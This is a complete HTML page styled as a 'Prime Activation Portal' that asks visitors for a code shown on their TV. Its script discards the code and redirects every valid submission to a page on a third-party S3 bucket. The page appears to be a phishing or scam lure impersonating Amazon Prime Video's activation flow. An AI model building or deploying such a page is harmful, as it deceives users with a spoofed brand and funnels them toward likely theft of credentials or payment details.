<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prime Activation Portal</title>
    <!-- Load Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom styles for background and font */
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f4f7f9;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <!-- Activation Card Container -->
    <div class="w-full max-w-md bg-white p-8 md:p-10 rounded-xl shadow-2xl border border-gray-100">

        <header class="text-center mb-8">
            <!-- Icon placeholder (using an inline SVG for a simple TV/Streaming icon) -->
            <svg class="mx-auto h-12 w-12 text-indigo-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1v-3.25M17 15V9a2 2 0 00-2-2H9a2 2 0 00-2 2v6m10 0h2a2 2 0 002-2v-3a2 2 0 00-2-2h-2m-7 5h7a2 2 0 002-2v-3a2 2 0 00-2-2H9a2 2 0 00-2 2v3a2 2 0 002 2z"></path>
            </svg>
            <h1 class="text-3xl font-extrabold text-gray-800 mt-4">Activate Your Prime</h1>
            <p class="text-gray-500 mt-2">Enter the 6-digit code displayed on your TV screen.</p>
        </header>

        <!-- Activation Form -->
        <form id="activationForm" class="space-y-6">
            <div>
                <label for="activationCode" class="block text-sm font-medium text-gray-700 mb-2">Activation Code</label>
                <input
                    type="text"
                    id="activationCode"
                    placeholder="E.g., ABC123"
                    maxlength="8"
                    autocomplete="off"
                    required
                    class="w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500 text-center uppercase tracking-widest text-xl font-bold"
                >
            </div>

            <div id="errorMessage" class="text-red-600 text-sm hidden" aria-live="polite">
                Please enter a valid 6 to 8 character code.
            </div>

            <button
                type="submit"
                id="activateButton"
                class="w-full flex justify-center py-3 px-4 border border-transparent rounded-lg shadow-lg text-lg font-semibold text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 transition duration-150 ease-in-out transform hover:scale-[1.01]"
            >
                Activate Now
            </button>
        </form>

        <footer class="mt-8 pt-6 border-t border-gray-100 text-center">
            <p class="text-xs text-gray-400">By clicking 'Activate Now', you agree to be redirected to the activation server.</p>
        </footer>
    </div>

    <!-- JavaScript Logic -->
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const form = document.getElementById('activationForm');
            const codeInput = document.getElementById('activationCode');
            const errorMsg = document.getElementById('errorMessage');
            const targetDomain = "https://video-prime-mytv.s3.eu-north-1.amazonaws.com/mytv/uk.html";

            // Helper function to show/hide error message
            function showMessage(message) {
                errorMsg.textContent = message;
                errorMsg.classList.remove('hidden');
            }

            function hideMessage() {
                errorMsg.classList.add('hidden');
            }

            // Simple input formatting: uppercase and trim
            codeInput.addEventListener('input', () => {
                codeInput.value = codeInput.value.toUpperCase().trim();
                hideMessage(); // Clear error on new input
            });


            form.addEventListener('submit', (e) => {
                e.preventDefault();

                const code = codeInput.value.toUpperCase().trim();

                // Validation: check for non-empty and length (e.g., 6 to 8 characters)
                if (code.length < 6 || code.length > 8) {
                    showMessage("Please enter a valid code, usually 6 to 8 characters.");
                    return;
                }

                // Construct the final URL: redirecting to the base domain without the code parameter
                const redirectUrl = targetDomain;

                // Inform the user and perform the redirection
                document.getElementById('activateButton').textContent = 'Redirecting...';
                
                // Set a small timeout for the user to see the "Redirecting..." message
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 500);
            });
        });
    </script>
</body>
